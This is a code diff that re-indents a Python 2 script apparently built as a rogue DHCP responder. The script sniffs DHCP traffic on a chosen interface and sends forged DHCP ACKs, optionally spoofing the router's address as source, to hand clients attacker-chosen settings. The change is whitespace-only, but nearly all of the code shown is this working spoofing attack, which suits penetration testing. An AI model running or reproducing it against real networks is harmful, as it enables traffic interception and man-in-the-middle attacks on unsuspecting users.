@@ -50,29 +50,29 @@ def ShowWelcome():
     print Message
 
 if options.OURIP is None:
-   print "\n\033[1m\033[31m-i mandatory option is missing, please provide your IP address.\033[0m\n"
-   parser.print_help()
-   exit(-1)
+    print "\n\033[1m\033[31m-i mandatory option is missing, please provide your IP address.\033[0m\n"
+    parser.print_help()
+    exit(-1)
 
 if options.Interface is None:
-   print "\n\033[1m\033[31m-I mandatory option is missing, please provide an interface.\033[0m\n"
-   parser.print_help()
-   exit(-1)
+    print "\n\033[1m\033[31m-I mandatory option is missing, please provide an interface.\033[0m\n"
+    parser.print_help()
+    exit(-1)
 
 if options.RouterIP is None:
-   print "\n\033[1m\033[31m-r mandatory option is missing, please provide the router's IP.\033[0m\n"
-   parser.print_help()
-   exit(-1)
+    print "\n\033[1m\033[31m-r mandatory option is missing, please provide the router's IP.\033[0m\n"
+    parser.print_help()
+    exit(-1)
 
 if options.DNSIP is None:
-   print "\n\033[1m\033[31m-p mandatory option is missing, please provide the primary DNS server ip address or yours.\033[0m\n"
-   parser.print_help()
-   exit(-1)
+    print "\n\033[1m\033[31m-p mandatory option is missing, please provide the primary DNS server ip address or yours.\033[0m\n"
+    parser.print_help()
+    exit(-1)
 
 if options.DNSIP2 is None:
-   print "\n\033[1m\033[31m-s mandatory option is missing, please provide the secondary DNS server ip address or yours.\033[0m\n"
-   parser.print_help()
-   exit(-1)
+    print "\n\033[1m\033[31m-s mandatory option is missing, please provide the secondary DNS server ip address or yours.\033[0m\n"
+    parser.print_help()
+    exit(-1)
 
 ShowWelcome()
 
@@ -96,25 +96,25 @@ Spoof = options.Spoof
 Request = options.Request
 
 if Spoof:
-   DHCPSERVER = ROUTERIP
+    DHCPSERVER = ROUTERIP
 
 def SpoofIP(Spoof):
     if Spoof:
-       return ROUTERIP
+        return ROUTERIP
     else:
-       return OURIP 
+        return OURIP
 
 def RespondToSpecificHost(RespondTo):
     if len(RespondTo)>=1 and RespondTo != ['']:
-       return True
+        return True
     else:
-       return False
+        return False
 
 def RespondToIPScope(RespondTo, ClientIp):
     if ClientIp in RespondTo:
-       return True
+        return True
     else:
-       return False
+        return False
 
 class Packet():
     fields = OrderedDict([
@@ -270,21 +270,21 @@ def ParseMac(data):
 
 def IsUDP(data):
     if data[0][23:24] == "\x11":
-       return True
+        return True
     if data[0][23:24] == "\x06":
-       return False
+        return False
 
 def ParseSrcDSTAddr(data):
-     SrcIP = inet_ntoa(data[0][26:30])
-     DstIP = inet_ntoa(data[0][30:34])
-     SrcPort = struct.unpack('>H',data[0][34:36])[0]
-     DstPort = struct.unpack('>H',data[0][36:38])[0]
-     return SrcIP,SrcPort,DstIP,DstPort
+    SrcIP = inet_ntoa(data[0][26:30])
+    DstIP = inet_ntoa(data[0][30:34])
+    SrcPort = struct.unpack('>H',data[0][34:36])[0]
+    DstPort = struct.unpack('>H',data[0][36:38])[0]
+    return SrcIP,SrcPort,DstIP,DstPort
 
 def FindIP(data):
     IP = ''.join(re.findall('(?<=\x32\x04)[^EOF]*', data))
     return ''.join(IP[0:4])
-    
+
 def ParseDHCPCode(data):
     PTid = data[4:8]
     Seconds = data[8:10]
@@ -294,88 +294,86 @@ def ParseDHCPCode(data):
     OpCode = data[242:243]
     RequestIP = data[245:249]
     if OpCode == "\x08":
-       i = IPHead(SrcIP = inet_aton(SpoofIP(Spoof)), DstIP=inet_aton(CurrentIP))
-       p = DHCPInformACK(Tid=PTid,ClientMac=MacAddr, ActualClientIP=inet_aton(CurrentIP), GiveClientIP=inet_aton("0.0.0.0"), NextServerIP=inet_aton("0.0.0.0"),RelayAgentIP=inet_aton("0.0.0.0"),BootpFlags="\x00\x00",ElapsedSec=Seconds)
-       p.calculate()
-       u = UDP(Data = p)
-       u.calculate()
-       for x in range(1):
-          SendDHCP(str(i)+str(u),(CurrentIP,68))
-       return '\033[1m\033[31mDHCP Inform received:\033[0m Current IP:%s Requested IP:%s Mac Address:%s Tid:%s'%(CurrentIP,RequestedIP,'-'.join('%02x' % ord(m) for m in MacAddr),'0x'+PTid.encode('hex'))
+        i = IPHead(SrcIP = inet_aton(SpoofIP(Spoof)), DstIP=inet_aton(CurrentIP))
+        p = DHCPInformACK(Tid=PTid,ClientMac=MacAddr, ActualClientIP=inet_aton(CurrentIP), GiveClientIP=inet_aton("0.0.0.0"), NextServerIP=inet_aton("0.0.0.0"),RelayAgentIP=inet_aton("0.0.0.0"),BootpFlags="\x00\x00",ElapsedSec=Seconds)
+        p.calculate()
+        u = UDP(Data = p)
+        u.calculate()
+        for x in range(1):
+            SendDHCP(str(i)+str(u),(CurrentIP,68))
+        return '\033[1m\033[31mDHCP Inform received:\033[0m Current IP:%s Requested IP:%s Mac Address:%s Tid:%s'%(CurrentIP,RequestedIP,'-'.join('%02x' % ord(m) for m in MacAddr),'0x'+PTid.encode('hex'))
 
     if OpCode == "\x03":
-       if Request:
-          IP = FindIP(data)
-          if IP:
-             IPConv = inet_ntoa(IP)
-             if RespondToSpecificHost(RespondTo) and RespondToIPScope(RespondTo, IPConv):
-                i = IPHead(SrcIP = inet_aton(SpoofIP(Spoof)), DstIP=IP)
-                p = DHCPACK(Tid=PTid,ClientMac=MacAddr, GiveClientIP=IP,BootpFlags="\x00\x00",ElapsedSec=Seconds)
-                p.calculate()
-                u = UDP(Data = p)
-                u.calculate()
-                for x in range(1):
-                   SendDHCP(str(i)+str(u),(IPConv,68))
-                return '\033[1m\033[31mIn-scope DHCP Request received:\033[0m Requested IP: %s Mac Address: %s Tid: %s'%(IPConv,'-'.join('%02x' % ord(m) for m in MacAddr),'0x'+PTid.encode('hex'))
-             if RespondToSpecificHost(RespondTo) == False:
-                i = IPHead(SrcIP = inet_aton(SpoofIP(Spoof)), DstIP=IP)
-                p = DHCPACK(Tid=PTid,ClientMac=MacAddr, GiveClientIP=IP,BootpFlags="\x00\x00",ElapsedSec=Seconds)
-                p.calculate()
-                u = UDP(Data = p)
-                u.calculate()
-                for x in range(1):
-                   SendDHCP(str(i)+str(u),(IPConv,68))
-                return '\033[1m\033[31mDHCP Request received:\033[0m Requested IP: %s Mac Address: %s Tid: %s'%(IPConv,'-'.join('%02x' % ord(m) for m in MacAddr),'0x'+PTid.encode('hex'))
+        if Request:
+            IP = FindIP(data)
+            if IP:
+                IPConv = inet_ntoa(IP)
+                if RespondToSpecificHost(RespondTo) and RespondToIPScope(RespondTo, IPConv):
+                    i = IPHead(SrcIP = inet_aton(SpoofIP(Spoof)), DstIP=IP)
+                    p = DHCPACK(Tid=PTid,ClientMac=MacAddr, GiveClientIP=IP,BootpFlags="\x00\x00",ElapsedSec=Seconds)
+                    p.calculate()
+                    u = UDP(Data = p)
+                    u.calculate()
+                    for x in range(1):
+                        SendDHCP(str(i)+str(u),(IPConv,68))
+                    return '\033[1m\033[31mIn-scope DHCP Request received:\033[0m Requested IP: %s Mac Address: %s Tid: %s'%(IPConv,'-'.join('%02x' % ord(m) for m in MacAddr),'0x'+PTid.encode('hex'))
+                if RespondToSpecificHost(RespondTo) == False:
+                    i = IPHead(SrcIP = inet_aton(SpoofIP(Spoof)), DstIP=IP)
+                    p = DHCPACK(Tid=PTid,ClientMac=MacAddr, GiveClientIP=IP,BootpFlags="\x00\x00",ElapsedSec=Seconds)
+                    p.calculate()
+                    u = UDP(Data = p)
+                    u.calculate()
+                    for x in range(1):
+                        SendDHCP(str(i)+str(u),(IPConv,68))
+                    return '\033[1m\033[31mDHCP Request received:\033[0m Requested IP: %s Mac Address: %s Tid: %s'%(IPConv,'-'.join('%02x' % ord(m) for m in MacAddr),'0x'+PTid.encode('hex'))
 
     if OpCode == "\x01":
-       if Request:
-          IP = FindIP(data)
-          if IP:
-             IPConv = inet_ntoa(IP)
-             if RespondToSpecificHost(RespondTo) and RespondToIPScope(RespondTo, IPConv):
-                i = IPHead(SrcIP = inet_aton(SpoofIP(Spoof)), DstIP=IP)
-                p = DHCPACK(Tid=PTid,ClientMac=MacAddr, GiveClientIP=IP,BootpFlags="\x00\x00", DHCPOpCode="\x02", ElapsedSec=Seconds)
-                p.calculate()
-                u = UDP(Data = p)
-                u.calculate()
-                for x in range(1):
-                   SendDHCP(str(i)+str(u),(IPConv,0))
-                return '\033[1m\033[31mIn-scope DHCP Discover received:\033[0m Requested IP: %s Mac Address: %s Tid: %s'%(IPConv,'-'.join('%02x' % ord(m) for m in MacAddr),'0x'+PTid.encode('hex'))
-             if RespondToSpecificHost(RespondTo) == False:
-                i = IPHead(SrcIP = inet_aton(SpoofIP(Spoof)), DstIP=IP)
-                p = DHCPACK(Tid=PTid,ClientMac=MacAddr, GiveClientIP=IP,BootpFlags="\x00\x00", DHCPOpCode="\x02", ElapsedSec=Seconds)
-                p.calculate()
-                u = UDP(Data = p)
-                u.calculate()
-                for x in range(1):
-                   SendDHCP(str(i)+str(u),(IPConv,0))
-                return '\033[1m\033[31mDHCP Discover received:\033[0m Requested IP: %s Mac Address: %s Tid: %s'%(IPConv,'-'.join('%02x' % ord(m) for m in MacAddr),'0x'+PTid.encode('hex'))
+        if Request:
+            IP = FindIP(data)
+            if IP:
+                IPConv = inet_ntoa(IP)
+                if RespondToSpecificHost(RespondTo) and RespondToIPScope(RespondTo, IPConv):
+                    i = IPHead(SrcIP = inet_aton(SpoofIP(Spoof)), DstIP=IP)
+                    p = DHCPACK(Tid=PTid,ClientMac=MacAddr, GiveClientIP=IP,BootpFlags="\x00\x00", DHCPOpCode="\x02", ElapsedSec=Seconds)
+                    p.calculate()
+                    u = UDP(Data = p)
+                    u.calculate()
+                    for x in range(1):
+                        SendDHCP(str(i)+str(u),(IPConv,0))
+                    return '\033[1m\033[31mIn-scope DHCP Discover received:\033[0m Requested IP: %s Mac Address: %s Tid: %s'%(IPConv,'-'.join('%02x' % ord(m) for m in MacAddr),'0x'+PTid.encode('hex'))
+                if RespondToSpecificHost(RespondTo) == False:
+                    i = IPHead(SrcIP = inet_aton(SpoofIP(Spoof)), DstIP=IP)
+                    p = DHCPACK(Tid=PTid,ClientMac=MacAddr, GiveClientIP=IP,BootpFlags="\x00\x00", DHCPOpCode="\x02", ElapsedSec=Seconds)
+                    p.calculate()
+                    u = UDP(Data = p)
+                    u.calculate()
+                    for x in range(1):
+                        SendDHCP(str(i)+str(u),(IPConv,0))
+                    return '\033[1m\033[31mDHCP Discover received:\033[0m Requested IP: %s Mac Address: %s Tid: %s'%(IPConv,'-'.join('%02x' % ord(m) for m in MacAddr),'0x'+PTid.encode('hex'))
 
     else:
-       return False
+        return False
 
 
 def SendDHCP(packet,Host):
-   Protocol = 0x0800
-   s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-   s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-   s.sendto(packet, Host)
+    Protocol = 0x0800
+    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+    s.sendto(packet, Host)
 
 def SniffUDPMac():
     s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
     Protocol = 0x0800
     s.bind((Interface, Protocol))
     while True:
-       data = s.recvfrom(65535)
-       if IsUDP(data):
-          SrcIP,SrcPort,DstIP,DstPort =  ParseSrcDSTAddr(data)
-          if SrcPort == 67 or DstPort == 67:
-             Message = ParseDHCPCode(data[0][42:])
-             if Message:
-                print 'DHCP Packet:\nSource IP/Port : %s:%s Destination IP/Port: %s:%s'%(SrcIP,SrcPort,DstIP,DstPort)
-                print Message
+        data = s.recvfrom(65535)
+        if IsUDP(data):
+            SrcIP,SrcPort,DstIP,DstPort =  ParseSrcDSTAddr(data)
+            if SrcPort == 67 or DstPort == 67:
+                Message = ParseDHCPCode(data[0][42:])
+                if Message:
+                    print 'DHCP Packet:\nSource IP/Port : %s:%s Destination IP/Port: %s:%s'%(SrcIP,SrcPort,DstIP,DstPort)
+                    print Message
 
 
 SniffUDPMac()
-
-
